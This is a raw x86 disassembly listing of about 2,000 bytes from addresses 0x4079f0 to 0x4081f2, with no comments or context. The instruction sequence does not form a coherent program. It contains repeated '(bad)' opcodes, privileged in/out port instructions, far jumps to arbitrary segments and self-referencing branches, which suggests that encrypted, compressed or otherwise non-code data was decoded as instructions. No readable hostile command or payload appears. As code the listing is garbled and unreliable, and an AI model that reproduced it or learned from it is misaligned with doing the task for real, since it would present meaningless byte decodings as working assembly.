  4079f0:	call   0x6c218153
  4079f5:	lds    edx,FWORD PTR [ebx+0x79]
  4079f8:	fsub   DWORD PTR [esi+eiz*2]
  4079fb:	or     ecx,ebx
  4079fd:	aaa    
  4079fe:	imul   esp,esi,0xffffff9b
  407a01:	adc    al,0x3f
  407a03:	shl    DWORD PTR [edi+edx*2+0x10],cl
  407a07:	pop    esp
  407a08:	jae    0x40799b
  407a0a:	xor    DWORD PTR [esi],esi
  407a0c:	pop    es
  407a0d:	in     al,0x8a
  407a0f:	push   ebx
  407a10:	imul   edi,DWORD PTR [eax-0x43984aff],0xffffffaa
  407a17:	daa    
  407a18:	ficom  WORD PTR [edi+0x5b3ed580]
  407a1e:	and    BYTE PTR [edi],bh
  407a20:	(bad)  
  407a21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a22:	cs mov ah,0x8b
  407a25:	jmp    0xd3f29510
  407a2a:	mov    dl,0x3a
  407a2c:	add    DWORD PTR [ecx],esp
  407a2e:	xchg   dl,al
  407a30:	inc    edx
  407a31:	or     al,0x22
  407a33:	fiadd  DWORD PTR [eax+0x69168853]
  407a39:	or     al,0x2b
  407a3b:	lods   al,BYTE PTR ds:[esi]
  407a3c:	adc    ah,BYTE PTR [edi]
  407a3e:	loop   0x4079fc
  407a40:	mov    edx,0x67f8a3a3
  407a45:	or     ah,dh
  407a47:	daa    
  407a48:	clc    
  407a49:	adc    BYTE PTR [ecx-0x7],dh
  407a4c:	and    DWORD PTR [ebx-0x80],edi
  407a4f:	mov    ah,0x76
  407a51:	lds    ebp,FWORD PTR [edi-0x283cd54b]
  407a57:	out    dx,al
  407a58:	enter  0x3ab5,0xf7
  407a5c:	pop    es
  407a5d:	jnp    0x4079e9
  407a5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a60:	imul   edx,DWORD PTR [edi-0x8fc16ff],0x49
  407a67:	jmp    0xb7342256
  407a6c:	sub    dh,BYTE PTR [ecx]
  407a6e:	jbe    0x407a6d
  407a70:	div    ecx
  407a72:	add    al,0xb2
  407a74:	jnp    0x407a7c
  407a76:	es mov es,ebx
  407a79:	out    0x5a,eax
  407a7b:	jb     0x407ade
  407a7d:	inc    ecx
  407a7e:	mov    ebp,edi
  407a80:	mov    ah,0x4e
  407a82:	push   0x91d86642
  407a87:	push   esi
  407a88:	pushf  
  407a89:	jmp    0xd9a7:0x67530551
  407a90:	mov    DWORD PTR [edx+0x4e4f904d],ebx
  407a96:	mov    bh,0x53
  407a98:	xchg   DWORD PTR [ebx+0x31],ebx
  407a9b:	(bad)  
  407a9c:	pop    edx
  407a9d:	cmp    eax,0x3965e78d
  407aa2:	nop
  407aa3:	xchg   DWORD PTR [ecx],edi
  407aa5:	jle    0x407aa5
  407aa7:	hlt    
  407aa8:	nop
  407aa9:	mov    edx,0x1c05ce41
  407aae:	mov    ch,0xc7
  407ab0:	pushf  
  407ab1:	dec    esp
  407ab2:	or     eax,0x4dfa1dac
  407ab7:	scas   eax,DWORD PTR es:[edi]
  407ab8:	add    eax,0xab31a478
  407abd:	push   ebx
  407abe:	les    esi,FWORD PTR [esi]
  407ac0:	repz ror DWORD PTR [edi-0x43],0xaa
  407ac5:	aas    
  407ac6:	sar    BYTE PTR [esi-0xa5b8e28],1
  407acc:	sti    
  407acd:	pop    ebx
  407ace:	jbe    0x407b0f
  407ad0:	push   0xffffffa7
  407ad2:	inc    edi
  407ad3:	mov    ch,0x1f
  407ad5:	pop    es
  407ad6:	dec    edx
  407ad7:	inc    edx
  407ad8:	jl     0x407ade
  407ada:	jmp    0x407abf
  407adc:	mov    edi,0xb2e6ba37
  407ae1:	adc    al,0x3b
  407ae3:	shr    DWORD PTR [ebx],cl
  407ae5:	xor    esp,DWORD PTR [edx]
  407ae7:	sub    edi,DWORD PTR [ebx-0x7c]
  407aea:	into   
  407aeb:	pusha  
  407aec:	sub    dl,BYTE PTR [ebx+0x6bbe8be0]
  407af2:	ret    
  407af3:	mov    ds:0x41e31f22,eax
  407af8:	pop    ds
  407af9:	jne    0x407b0a
  407afb:	aad    0xd2
  407afd:	mov    dh,0xce
  407aff:	or     BYTE PTR ds:[edi-0x30],dh
  407b03:	push   0x1e9e3713
  407b08:	inc    esi
  407b09:	inc    esi
  407b0a:	sub    ah,BYTE PTR [edx+0x4c]
  407b0d:	push   edx
  407b0e:	inc    ecx
  407b0f:	adc    ebx,eax
  407b11:	xchg   esp,eax
  407b12:	mov    esi,0x4bb49db5
  407b17:	outs   dx,DWORD PTR ds:[esi]
  407b18:	jmp    0x407b83
  407b1a:	push   ecx
  407b1b:	repz loope 0x407b55
  407b1e:	xor    eax,0x210d45e6
  407b23:	xor    BYTE PTR [edx],0xd3
  407b26:	loopne 0x407aca
  407b28:	mov    esi,0x877ae746
  407b2d:	pop    ebx
  407b2e:	adc    al,0x3f
  407b30:	aas    
  407b31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b32:	retf   
  407b33:	mov    ch,0xe5
  407b35:	out    0x4b,eax
  407b37:	imul   ebp,ebp,0xebf95781
  407b3d:	test   DWORD PTR [ebx],0x20a130dc
  407b43:	mov    ecx,0x8ccf82e8
  407b48:	shl    DWORD PTR ss:[esp+edi*1],0xab
  407b4d:	push   esp
  407b4e:	mov    ah,0x2f
  407b50:	xor    al,0x97
  407b52:	ins    BYTE PTR es:[edi],dx
  407b53:	aad    0xec
  407b55:	pop    ebx
  407b56:	lods   al,BYTE PTR ds:[esi]
  407b57:	aas    
  407b58:	sub    ah,BYTE PTR [edi+0x6bf2b550]
  407b5e:	dec    ebx
  407b5f:	jl     0x407b49
  407b61:	add    DWORD PTR [edi],eax
  407b63:	and    ch,BYTE PTR [ebx-0x7d]
  407b66:	push   ebx
  407b67:	jp     0x407b41
  407b69:	pop    edx
  407b6a:	addr16 and al,0x32
  407b6d:	push   ebx
  407b6e:	mov    ch,0x78
  407b70:	jae    0x407b38
  407b72:	xor    DWORD PTR [esi],esp
  407b74:	pop    es
  407b75:	pop    eax
  407b76:	mov    dh,BYTE PTR [esi+0x72]
  407b79:	(bad)  
  407b7a:	push   edx
  407b7b:	loopne 0x407b77
  407b7d:	xor    DWORD PTR [edx+ebp*8+0x2aaadc20],ecx
  407b84:	xor    DWORD PTR [edi-0x1a],esi
  407b87:	jb     0x407b3b
  407b89:	jmp    0x7086:0x67012cb2
  407b90:	or     DWORD PTR [ecx+eax*8],0xffffffe3
  407b94:	pop    ebp
  407b95:	aaa    
  407b96:	and    edx,ebp
  407b98:	mov    edi,0x225020f7
  407b9d:	pop    ss
  407b9e:	push   ecx
  407b9f:	or     al,0x5a
  407ba1:	pop    ebp
  407ba2:	and    DWORD PTR [edx-0x2e],edx
  407ba5:	loopne 0x407bb8
  407ba7:	or     ebx,DWORD PTR [ecx]
  407ba9:	mov    eax,0x49d057d0
  407bae:	xor    DWORD PTR [edi],eax
  407bb0:	sbb    ebp,esp
  407bb2:	rcr    BYTE PTR [ebx-0x30],1
  407bb5:	dec    ebp
  407bb6:	xor    DWORD PTR ds:0x5dd0e109,eax
  407bbc:	shr    BYTE PTR [edx+0x31],1
  407bbf:	add    BYTE PTR [ecx],cl
  407bc1:	clc    
  407bc2:	rcr    BYTE PTR [esi-0x30],1
  407bc5:	push   0x80091f31
  407bca:	rol    BYTE PTR [ebx-0x2d],1
  407bcd:	enter  0x1dc0,0x6
  407bd1:	(bad)  
  407bd2:	fild   WORD PTR [edi+ebx*8+0x2d]
  407bd6:	sbb    BYTE PTR ds:[esi],al
  407bd9:	(bad)  
  407bdb:	inc    esi
  407bdc:	fcmovnbe st,st(4)
  407bde:	std    
  407bdf:	lods   al,BYTE PTR ds:[esi]
  407be0:	inc    ebx
  407be1:	mov    edx,0x2c99ce42
  407be6:	popf   
  407be7:	xchg   ecx,eax
  407be8:	inc    ecx
  407be9:	mov    edx,0x2c9fcf46
  407bee:	mov    eax,0xfe8a4791
  407bf3:	repz popf 
  407bf5:	fdivr  QWORD PTR [ecx+eiz*2+0x3e5f4a45]
  407bfc:	jecxz  0x407bda
  407bfe:	xchg   esi,eax
  407bff:	popa   
  407c00:	cmp    DWORD PTR [edx],ebx
  407c02:	fmul   st(6),st
  407c04:	out    0x2c,al
  407c06:	sti    
  407c07:	xchg   ecx,eax
  407c08:	cmp    al,0xba
  407c0a:	and    eax,0xce2cebce
  407c0f:	xchg   ecx,eax
  407c10:	xor    BYTE PTR [edx+0x2cefce3b],bh
  407c16:	fcom   DWORD PTR [ecx-0x31d245cb]
  407c1c:	repz sub al,0xd2
  407c1f:	xchg   ecx,eax
  407c20:	sub    edi,DWORD PTR [edx+0x2cf1ce60]
  407c26:	test   DWORD PTR [ecx+0x7b73ad2f],edx
  407c2c:	fisttp WORD PTR [ebx+0x3e]
  407c2f:	ja     0x407c37
  407c31:	jmp    0x407c2f
  407c33:	cmp    eax,0x705d63bc
  407c38:	gs out 0x87,eax
  407c3b:	and    eax,0x4d5d463c
  407c40:	xchg   BYTE PTR gs:[esp+edx*1+0x485d29bc],bh
  407c48:	cmp    BYTE PTR gs:[ecx+ebx*1+0x445d1ebc],0x65
  407c51:	pushf  
  407c52:	mov    esp,0x5d08bc1d
  407c57:	inc    ecx
  407c58:	mov    bh,BYTE PTR gs:[ecx+eax*1+0x5f5d02bc]
  407c60:	sar    DWORD PTR gs:[ebx+eax*1+0x5b5d5bbc],0x65
  407c69:	aam    0xbc
  407c6b:	or     DWORD PTR [edx+ecx*2-0x159aa8a3],edi
  407c72:	mov    esp,0x5d62bc0a
  407c77:	push   eax
  407c78:	gs out 0xbb,al
  407c7b:	push   cs
  407c7c:	mov    edi,0xdc4a6311
  407c81:	es sti 
  407c83:	inc    ebx
  407c84:	pop    es
  407c85:	sbb    al,0x88
  407c87:	sahf   
  407c88:	cs mov edx,0x27dbef03
  407c8e:	popa   
  407c8f:	bound  ebx,QWORD PTR [eax]
  407c91:	mov    ds:0x36ac31ac,al
  407c96:	dec    ebp
  407c97:	pop    ss
  407c98:	jo     0x407c4e
  407c9a:	fwait
  407c9b:	iret   
  407c9c:	add    ecx,DWORD PTR [edx+edi*1]
  407c9f:	fwait
  407ca0:	pop    ecx
  407ca1:	and    ecx,eax
  407ca3:	sti    
  407ca4:	sub    al,0x99
  407ca6:	retf   0xc426
  407ca9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407caa:	add    ecx,DWORD PTR [ecx]
  407cac:	aas    
  407cad:	mov    edx,0x1bdc204
  407cb2:	in     eax,0xad
  407cb4:	fucomi st,st(3)
  407cb6:	leave  
  407cb7:	sub    eax,0x315f8c19
  407cbc:	bound  esi,QWORD PTR [edx]
  407cbe:	xor    esi,DWORD PTR [ebx-0x632d87f5]
  407cc4:	popf   
  407cc5:	stos   DWORD PTR es:[edi],eax
  407cc6:	out    0xf3,al
  407cc8:	ret    0x208a
  407ccb:	leave  
  407ccc:	lods   eax,DWORD PTR ds:[esi]
  407ccd:	mov    al,0x4a
  407ccf:	clc    
  407cd0:	(bad)  
  407cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cd2:	or     ecx,DWORD PTR [ecx]
  407cd4:	sbb    BYTE PTR [ebx+0x6e856f6],al
  407cda:	rcl    ebx,0x2c
  407cdd:	pushf  
  407cde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cdf:	and    DWORD PTR [ecx+0xc],ecx
  407ce2:	je     0x407ce2
  407ce4:	pop    es
  407ce5:	fwait
  407ce6:	jmp    0x407c78
  407ce8:	fidivr WORD PTR [ecx+0x3cf3f]
  407cee:	cmp    cl,BYTE PTR [ebp-0x1bb9887]
  407cf4:	stos   BYTE PTR es:[edi],al
  407cf5:	pop    ecx
  407cf6:	int    0xb6
  407cf8:	jb     0x407cc8
  407cfa:	sbb    eax,0x3a29b381
  407cff:	sub    BYTE PTR [edx-0x73],0xdb
  407d03:	out    0xa0,eax
  407d05:	icebp  
  407d06:	call   0x66a87bf8
  407d0b:	(bad)  
  407d0c:	lods   al,BYTE PTR ds:[esi]
  407d0d:	pop    edi
  407d0e:	dec    ebp
  407d0f:	jge    0x407d81
  407d11:	mov    bl,0x91
  407d13:	iret   
  407d14:	adc    al,0x61
  407d16:	cmp    ch,BYTE PTR [edx-0x6e]
  407d19:	call   0xd239:0x13339b31
  407d20:	xchg   BYTE PTR [edx+0x72],ah
  407d23:	(bad)  
  407d25:	loop   0x407cfc
  407d27:	test   eax,0x1d3cae3f
  407d2c:	xor    edx,DWORD PTR [ebp-0x42]
  407d2f:	shl    BYTE PTR [edi+0x14a0d0f9],cl
  407d35:	sti    
  407d36:	xor    ebx,ebp
  407d38:	mov    ebp,0x3c98e709
  407d3d:	add    DWORD PTR [ecx+0x1d8194af],ebp
  407d43:	rol    DWORD PTR [edx+0x584f45c1],1
  407d49:	add    ch,BYTE PTR [edi]
  407d4b:	mov    dh,0x80
  407d4d:	aam    0xcf
  407d4f:	sub    bl,BYTE PTR [esi+0x2]
  407d52:	hlt    
  407d53:	ss xchg ah,dl
  407d56:	cmp    DWORD PTR [ecx+0x5c],ebp
  407d59:	inc    edx
  407d5a:	shl    DWORD PTR [esi],1
  407d5c:	test   ah,dl
  407d5e:	arpl   WORD PTR [ecx+0x52],bp
  407d61:	inc    edx
  407d62:	xor    BYTE PTR [esi],0x8a
  407d65:	aam    0x67
  407d67:	imul   edx,DWORD PTR [eax+0x4a],0x2e88eefc
  407d6e:	mov    esi,0xc0f956d2
  407d73:	lea    ecx,[esi+0x54d2276f]
  407d79:	stc    
  407d7a:	les    ecx,FWORD PTR [ebp-0x2dfe9074]
  407d80:	dec    edx
  407d81:	stc    
  407d82:	fisttp WORD PTR [ebp-0x2d9f906e]
  407d88:	dec    eax
  407d89:	stc    
  407d8a:	xchg   DWORD PTR [ebp-0x2d9b9070],ecx
  407d90:	dec    esi
  407d91:	stc    
  407d92:	mov    ecx,DWORD PTR [ebp-0x2d97906a]
  407d98:	dec    esp
  407d99:	stc    
  407d9a:	mov    BYTE PTR [ebp-0x2d90906c],cl
  407da0:	inc    edx
  407da1:	stc    
  407da2:	mov    WORD PTR [ebp-0x2d8c9066],cs
  407da8:	inc    eax
  407da9:	stc    
  407daa:	nop
  407dab:	lea    ebx,[eax+0x46d2776f]
  407db1:	stc    
  407db2:	xchg   esp,eax
  407db3:	lea    ebx,[esi+0x44d27b6f]
  407db9:	js     0x407d8d
  407dbb:	dec    esi
  407dbc:	rol    ah,1
  407dbe:	add    eax,0x3c5a346e
  407dc3:	xor    BYTE PTR [edx],bl
  407dc5:	outs   dx,DWORD PTR ds:[esi]
  407dc6:	mov    esi,0x5f41866c
  407dcb:	xor    bl,BYTE PTR [edi-0x2b]
  407dce:	das    
  407dcf:	pop    edi
  407dd0:	xor    dh,BYTE PTR [esi+eiz*8+0x0]
  407dd4:	jmp    0x31a993b9
  407dd9:	inc    edx
  407dda:	in     al,0x36
  407ddc:	out    dx,eax
  407ddd:	fcomp  QWORD PTR ds:0xea9a37b1
  407de3:	out    dx,al
  407de4:	in     eax,dx
  407de5:	or     al,0x8
  407de7:	mov    cl,0x35
  407de9:	call   0xb10e:0xcf1eee8
  407df0:	das    
  407df1:	call   0xb10c:0xcfbeeee
  407df8:	and    DWORD PTR [edx+0xcfdeeec],ebx
  407dfe:	adc    dh,BYTE PTR [ecx-0x110d65db]
  407e04:	ret    
  407e05:	or     al,0x10
  407e07:	mov    cl,0x1b
  407e09:	call   0xb116:0xcc1eef0
  407e10:	push   ds
  407e11:	call   0xb114:0xcc5eef6
  407e18:	adc    bl,BYTE PTR [edx+0xccaeef4]
  407e1e:	sbb    dh,BYTE PTR [ecx-0x110565f0]
  407e24:	enter  0x180c,0xb1
  407e28:	push   ss
  407e29:	call   0xb11e:0xcceeef8
  407e30:	adc    eax,0xd0eefe9a
  407e35:	or     al,0x1c
  407e37:	mov    cl,0x61
  407e39:	call   0xabc5:0xc3bfe5fc
  407e40:	test   BYTE PTR [ebx+0x5438b698],0x7d
  407e47:	sub    ebp,esp
  407e49:	add    ah,dl
  407e4b:	ss add dl,ah
  407e4e:	add    BYTE PTR [ecx-0x28],ch
  407e51:	inc    edx
  407e52:	loopne 0x407e8a
  407e54:	add    ah,dl
  407e56:	push   es
  407e57:	imul   ebx,esi,0x636e642
  407e5d:	aam    0x4
  407e5f:	imul   ebx,esp,0x436e442
  407e65:	aam    0xa
  407e67:	imul   edx,edx,0xa36ea42
  407e6d:	aam    0x8
  407e6f:	imul   edx,eax,0x836e842
  407e75:	aam    0xe
  407e77:	imul   edx,esi,0xe36ee42
  407e7d:	aam    0xc
  407e7f:	imul   edx,esp,0xc36ec42
  407e85:	aam    0x12
  407e87:	imul   ecx,edx,0x1236f242
  407e8d:	aam    0x10
  407e8f:	imul   ecx,eax,0x1036f042
  407e95:	aam    0x16
  407e97:	imul   ecx,esi,0x1636f642
  407e9d:	aam    0x14
  407e9f:	imul   ecx,esp,0x1436f442
  407ea5:	aam    0x1a
  407ea7:	imul   eax,edx,0x1a36fa42
  407ead:	aam    0x18
  407eaf:	imul   eax,eax,0x6336c342
  407eb5:	aam    0x23
  407eb7:	imul   edi,DWORD PTR [ebx+0x6136c142],0xb96921d4
  407ec1:	inc    edx
  407ec2:	(bad)  
  407ec3:	ss addr16 aam 0x27
  407ec7:	imul   edi,DWORD PTR [edi+0x6536c542],0xbd6925d4
  407ed1:	inc    edx
  407ed2:	retf   
  407ed3:	ss imul edx,esp,0x2b
  407ed7:	imul   esi,DWORD PTR [ebx+0x6936c942],0xb16929d4
  407ee1:	inc    edx
  407ee2:	iret   
  407ee3:	outs   dx,DWORD PTR ss:[esi]
  407ee5:	aam    0x2f
  407ee7:	imul   esi,DWORD PTR [edi+0x6d36cd42],0xb5692dd4
  407ef1:	inc    edx
  407ef2:	shl    DWORD PTR [esi],cl
  407ef4:	jae    0x407eca
  407ef6:	xor    ebp,DWORD PTR [ecx-0x55]
  407ef9:	inc    edx
  407efa:	shl    DWORD PTR [esi],1
  407efc:	jno    0x407ed2
  407efe:	arpl   WORD PTR [eax+0x68],ax
  407f01:	call   0x3c64:0xc70635d
  407f08:	stos   DWORD PTR es:[edi],eax
  407f09:	call   0xbc68:0xc7763a1
  407f10:	scas   eax,DWORD PTR es:[edi]
  407f11:	call   0xbc6c:0xc75e3a5
  407f18:	lods   eax,DWORD PTR ds:[esi]
  407f19:	call   0xbc70:0xc7be3a9
  407f20:	mov    ds:0x79e1ad9a,eax
  407f25:	outs   dx,DWORD PTR ds:[esi]
  407f26:	mov    esi,0x6b2986f5
  407f2b:	lods   eax,DWORD PTR ds:[esi]
  407f2c:	mov    cl,0x6f
  407f2e:	mov    esi,0x6b2b863f
  407f33:	scas   eax,DWORD PTR es:[edi]
  407f34:	mov    ch,0x6f
  407f36:	mov    esi,0x3c3586f1
  407f3b:	out    0x2,eax
  407f3d:	mov    ds:0x37e5acdd,al
  407f42:	xor    edx,esi
  407f44:	xor    BYTE PTR [ebp+0x31e5cddc],cl
  407f4a:	push   ds
  407f4b:	cmp    DWORD PTR [ecx-0x79544191],eax
  407f51:	xor    ebp,esp
  407f53:	jecxz  0x407ee9
  407f55:	pushf  
  407f56:	lds    eax,FWORD PTR [ecx]
  407f58:	inc    edx
  407f59:	or     al,0x2b
  407f5b:	dec    BYTE PTR [ecx+0x4021cb9c]
  407f61:	ins    BYTE PTR es:[edi],dx
  407f62:	sub    esi,edi
  407f64:	lea    ebx,[ecx+ecx*8+0x2f0c4621]
  407f6b:	(bad)  
  407f6c:	xchg   ecx,eax
  407f6d:	pushf  
  407f6e:	push   edx
  407f6f:	and    DWORD PTR [esp+ecx*1+0x2d],eax
  407f73:	(bad)  
  407f74:	xchg   ebp,eax
  407f75:	pushf  
  407f76:	int    0x21
  407f78:	cmp    cl,BYTE PTR [ebp*2-0xd636602]
  407f7f:	and    DWORD PTR [eax],edi
  407f81:	or     al,0x12
  407f83:	jle    0x407fae
  407f85:	call   0x7e17:0xa38a184
  407f8c:	out    0x9a,al
  407f8e:	mul    DWORD PTR [ecx+0x7e670a3c]
  407f94:	in     al,0x9a
  407f96:	icebp  
  407f97:	mov    eax,ds:0x7e660a30
  407f9c:	jmp    0x1a0d:0x34a1fa9a
  407fa3:	iret   
  407fa4:	add    ebp,DWORD PTR [ecx]
  407fa6:	cmp    dl,BYTE PTR [ebp-0x1e09887]
  407fac:	stos   DWORD PTR es:[edi],eax
  407fad:	cs cld 
  407faf:	nop
  407fb0:	les    edi,FWORD PTR [ebx+0x2d1ccff3]
  407fb6:	adc    ecx,DWORD PTR [edx-0x30e2ac4b]
  407fbc:	arpl   WORD PTR ds:0xbbbb9011,bp
  407fc2:	not    ebp
  407fc4:	popa   
  407fc5:	int    0xfc
  407fc7:	nop
  407fc8:	mov    ecx,0x15cff5bb
  407fcd:	sub    eax,0x63c88a15
  407fd2:	sbb    eax,0x1b2d6fcf
  407fd7:	nop
  407fd8:	mov    cl,0xbb
  407fda:	stc    
  407fdb:	aad    0x14
  407fdd:	std    
  407fde:	cld    
  407fdf:	nop
  407fe0:	mov    dl,0xbb
  407fe2:	dec    edi
  407fe4:	outs   dx,BYTE PTR ds:[esi]
  407fe5:	sub    eax,0x73b38a1f
  407fea:	sbb    eax,0x88eb64d1
  407fef:	sub    eax,0x792cab18
  407ff4:	xor    ebp,DWORD PTR ds:0xbb6cbfe4
  407ffa:	pop    es
  407ffb:	xlat   BYTE PTR ds:[ebx]
  407ffc:	fldcw  WORD PTR ds:0xbb60bae4
  408002:	pop    es
  408003:	in     al,0xdd
  408005:	sub    eax,0xbb648ae4
  40800a:	add    eax,0xe22d21e2
  40800f:	mov    eax,DWORD PTR [edx]
  408011:	popf   
  408012:	mov    al,ds:0x4a1c3a13
  408017:	mov    ah,0xc4
  408019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40801a:	cmp    BYTE PTR [ecx],cl
  40801c:	aas    
  40801d:	jmp    0x40804b
  40801f:	push   esi
  408020:	out    0x1d,eax
  408022:	and    eax,0x32eb3d09
  408027:	push   esi
  408028:	in     eax,0x7d
  40802a:	ror    BYTE PTR [ecx],cl
  40802c:	or     al,0x8b
  40802e:	sub    BYTE PTR [esi-0x26],dl
  408031:	sbb    eax,0xeb020931
  408036:	ss push esi
  408038:	fdivr  DWORD PTR [ebp-0x2a]
  40803b:	or     DWORD PTR [eax],eax
  40803d:	jmp    0x408073
  40803f:	ds loop 0x4080bf
  408042:	aam    0x9
  408044:	xor    ebx,ebp
  408046:	cmp    dl,BYTE PTR [esi-0x2a]
  408049:	jge    0x408025
  40804b:	or     DWORD PTR [eax],ecx
  40804d:	jmp    0x408087
  40804f:	push   esi
  408050:	in     eax,dx
  408051:	xor    eax,0x8b0b0931
  408056:	sub    BYTE PTR [esi-0x29],dl
  408059:	jge    0x408039
  40805b:	or     DWORD PTR [edx],ecx
  40805d:	jmp    0x40809b
  40805f:	push   esi
  408060:	fnstsw WORD PTR [ebp-0x24]
  408063:	or     DWORD PTR [ecx],ecx
  408065:	mov    ds:0x3fda0dc,eax
  40806a:	and    BYTE PTR [ebx-0x53],dl
  40806d:	fwait
  40806e:	dec    ebp
  40806f:	or     eax,0x552c0cf5
  408074:	lods   al,BYTE PTR ds:[esi]
  408075:	cdq    
  408076:	dec    ebp
  408077:	or     ebp,DWORD PTR [edx+ecx*4-0x17]
  40807b:	push   esi
  40807c:	lods   al,BYTE PTR ds:[esi]
  40807d:	lahf   
  40807e:	dec    ebp
  40807f:	push   es
  408080:	jne    0x40808d
  408082:	lods   al,BYTE PTR ds:[esi]
  408083:	pop    eax
  408084:	mov    ch,0xf
  408086:	adc    BYTE PTR [eax],dl
  408088:	les    ecx,FWORD PTR [edx]
  40808a:	sbb    eax,0xfc961d5f
  40808f:	add    ebp,esi
  408091:	nop
  408092:	add    eax,DWORD PTR [eax-0x4b]
  408095:	sbb    al,0x1c
  408097:	sbb    al,0x75
  408099:	sub    BYTE PTR [edx+eax*2+0x1acdbdac],ch
  4080a0:	jne    0x4080cc
  4080a2:	lods   al,BYTE PTR ds:[esi]
  4080a3:	inc    esp
  4080a4:	lods   al,BYTE PTR ds:[esi]
  4080a5:	(bad)  [ebp+0x18]
  4080a8:	jne    0x4080bf
  4080aa:	lods   al,BYTE PTR ds:[esi]
  4080ab:	inc    esi
  4080ac:	mov    ch,0x1c
  4080ae:	or     BYTE PTR [esi],dl
  4080b0:	jne    0x4080fa
  4080b2:	lods   al,BYTE PTR ds:[esi]
  4080b3:	dec    eax
  4080b4:	lods   al,BYTE PTR ds:[esi]
  4080b5:	fmul   DWORD PTR [ebp+0x14]
  4080b8:	jne    0x4080ef
  4080ba:	lods   al,BYTE PTR ds:[esi]
  4080bb:	dec    edx
  4080bc:	lods   al,BYTE PTR ds:[esi]
  4080bd:	fisttp QWORD PTR [ebp+0x6f]
  4080c0:	jne    0x4080d6
  4080c2:	lods   al,BYTE PTR ds:[esi]
  4080c3:	xor    ebp,DWORD PTR [ecx+eax*4+0x16756d4d]
  4080ca:	lods   al,BYTE PTR ds:[esi]
  4080cb:	xor    eax,0x6b4d87ac
  4080d0:	jne    0x4080e2
  4080d2:	lods   al,BYTE PTR ds:[esi]
  4080d3:	aaa    
  4080d4:	lods   al,BYTE PTR ds:[esi]
  4080d5:	test   DWORD PTR [ebp+0x69],ecx
  4080d8:	jne    0x4080ec
  4080da:	lods   al,BYTE PTR ds:[esi]
  4080db:	cmp    DWORD PTR [ebx+ecx*4+0x1c75674d],ebp
  4080e2:	lods   al,BYTE PTR ds:[esi]
  4080e3:	cmp    ebp,DWORD PTR [ecx+ecx*4+0x1e75654d]
  4080ea:	lods   al,BYTE PTR ds:[esi]
  4080eb:	cmp    eax,0x634d8fac
  4080f0:	jne    0x40810a
  4080f2:	lods   al,BYTE PTR ds:[esi]
  4080f3:	aas    
  4080f4:	lods   al,BYTE PTR ds:[esi]
  4080f5:	lea    ecx,[ebp+0x61]
  4080f8:	jne    0x408114
  4080fa:	lods   al,BYTE PTR ds:[esi]
  4080fb:	and    DWORD PTR [ebx+esi*4+0x24757f4d],ebp
  408102:	lods   al,BYTE PTR ds:[esi]
  408103:	and    esi,DWORD PTR [esp+ebx*1+0x21757aa0]
  40810a:	lods   al,BYTE PTR ds:[esi]
  40810b:	and    al,0xb4
  40810d:	sbb    al,0xa4
  40810f:	js     0x40817b
  408111:	mov    ebx,0x2d84cff4
  408116:	sbb    dl,BYTE PTR [eax-0x300544ae]
  40811c:	mov    ch,BYTE PTR ds:0xbb4b9023
  408122:	ror    edi,0x91
  408125:	sub    eax,0xbb94f221
  40812a:	(bad)  
  40812b:	iret   
  40812c:	xchg   edi,eax
  40812d:	sub    eax,0xbb88f227
  408132:	lds    esi,FWORD PTR [ecx+0x5675ebc4]
  408138:	adc    bh,BYTE PTR [ebp-0x65]
  40813b:	or     edx,ecx
  40813d:	jmp    0x4081ba
  40813f:	push   esi
  408140:	adc    BYTE PTR [ebx+edx*2-0x71],bh
  408144:	enter  0xc1ea,0x42
  408148:	push   ds
  408149:	mov    cl,dh
  40814b:	popa   
  40814c:	sbb    eax,0xc410fcfd
  408151:	push   0x7f
  408153:	jae    0x408172
  408155:	jecxz  0x4080d9
  408157:	pop    edi
  408158:	add    al,BYTE PTR [ebx+ebx*8+0x3]
  40815c:	fcmovnbe st,st(0)
  40815e:	cmp    bl,BYTE PTR [ebp+0x2]
  408161:	inc    edi
  408162:	fild   DWORD PTR ds:0x5b3ad7db
  408168:	add    al,BYTE PTR [eax-0x25]
  40816b:	pop    es
  40816c:	fcmovnbe st,st(5)
  40816e:	cmp    bl,BYTE PTR [ecx+0x3]
  408171:	cmc    
  408172:	mov    ecx,0x3adbdb09
  408177:	push   edi
  408178:	add    cl,BYTE PTR [ebx+ebx*8+0x50]
  40817c:	sub    eax,0x588d751b
  408181:	push   es
  408182:	das    
  408183:	aam    0x80
  408185:	aam    0xcc
  408187:	and    DWORD PTR [esi+0xa],ebx
  40818a:	add    edi,DWORD PTR [esi-0x7a]
  40818d:	popf   
  40818e:	jecxz  0x4081b1
  408190:	pop    esp
  408191:	or     ah,BYTE PTR [ecx]
  408193:	jle    0x408119
  408195:	pushf  
  408196:	arpl   WORD PTR [ecx],sp
  408198:	push   edx
  408199:	or     al,BYTE PTR [eax+0x669c8a7e]
  40819f:	mov    eax,ds:0x7e850a50
  4081a4:	mov    BYTE PTR [ecx+ebx*2-0x41f5a9df],bl
  4081ab:	jle    0x40813b
  4081ad:	pushf  
  4081ae:	pop    esp
  4081af:	and    DWORD PTR [edx+ecx*1-0x7d],edx
  4081b3:	jle    0x408141
  4081b5:	pushf  
  4081b6:	push   0x21
  4081b8:	dec    edx
  4081b9:	or     cl,BYTE PTR [edi-0x596f6082]
  4081bf:	mov    WORD PTR [edi+0x66],es
  4081c2:	inc    ebx
  4081c3:	push   edx
  4081c4:	popf   
  4081c5:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081c7:	ins    DWORD PTR es:[edi],dx
  4081c8:	inc    ebp
  4081c9:	data16 or BYTE PTR [edx],dl
  4081cc:	jecxz  0x4081be
  4081ce:	test   BYTE PTR [ebp+0x3b],0x66
  4081d2:	ds adc ah,cl
  4081d5:	lock fmul QWORD PTR [ebp+0x3f]
  4081d9:	data16 and al,0x12
  4081dc:	jmp    0x4081ce
  4081de:	dec    BYTE PTR [ebp+0x33]
  4081e1:	pushaw 
  4081e3:	adc    ch,dh
  4081e5:	repz push ss
  4081e7:	(bad)  
  4081e8:	xor    al,0x7d
  4081ea:	icebp  
  4081eb:	sbb    esp,ebp
  4081ed:	jmp    0x408192
  4081ef:	push   esi
  4081f0:	sub    al,0x7d
  4081f2:	cmp    DWORD PTR [ecx],ebx
